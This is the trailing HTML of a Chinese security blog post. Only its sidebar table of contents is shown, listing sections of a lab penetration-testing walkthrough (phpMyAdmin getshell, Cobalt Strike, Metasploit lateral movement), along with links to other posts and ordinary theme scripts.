href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Struts2漏洞学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814121.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Struts2漏洞学习</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="常见webshell流量分析"><img class="cover" src="http://cdn.clown2024.cn/202407151814112.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见webshell流量分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">27</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">靶场说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Web页面渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">php探针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">其他页面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">phpmyadmin后台getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">yxcms</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">CS打法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">cs部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">cs上线靶机</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">MSF渗透打法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">CS联动MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">MSF横向移动</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/" title="NTFS数据流隐写"><img src="http://cdn.clown2024.cn/202407151814131.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NTFS数据流隐写"/></a><div class="content"><a class="title" href="/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/" title="NTFS数据流隐写">NTFS数据流隐写</a><time datetime="2024-07-12T12:39:30.000Z" title="发表于 2024-07-12 20:39:30">2024-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/" title="玄机应急响应靶场-第三章"><img src="http://cdn.clown2024.cn/202407151814114.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="玄机应急响应靶场-第三章"/></a><div class="content"><a class="title" href="/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/" title="玄机应急响应靶场-第三章">玄机应急响应靶场-第三章</a><time datetime="2024-07-12T07:53:07.000Z" title="发表于 2024-07-12 15:53:07">2024-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/12/mysql%E6%8F%90%E6%9D%83/" title="mysql提权"><img src="http://cdn.clown2024.cn/202407151814114.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql提权"/></a><div class="content"><a class="title" href="/2024/07/12/mysql%E6%8F%90%E6%9D%83/" title="mysql提权">mysql提权</a><time datetime="2024-07-11T17:22:48.000Z" title="发表于 2024-07-12 01:22:48">2024-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/" title="玄机应急响应靶场-第二章"><img src="http://cdn.clown2024.cn/202407151814115.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="玄机应急响应靶场-第二章"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/" title="玄机应急响应靶场-第二章">玄机应急响应靶场-第二章</a><time datetime="2024-07-10T06:31:01.000Z" title="发表于 2024-07-10 14:31:01">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/" title="玄机应急响应靶场-第一章"><img src="http://cdn.clown2024.cn/202407151814125.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="玄机应急响应靶场-第一章"/></a><div class="content"><a class="title" href="/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/" title="玄机应急响应靶场-第一章">玄机应急响应靶场-第一章</a><time datetime="2024-07-02T05:33:05.000Z" title="发表于 2024-07-02 13:33:05">2024-07-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
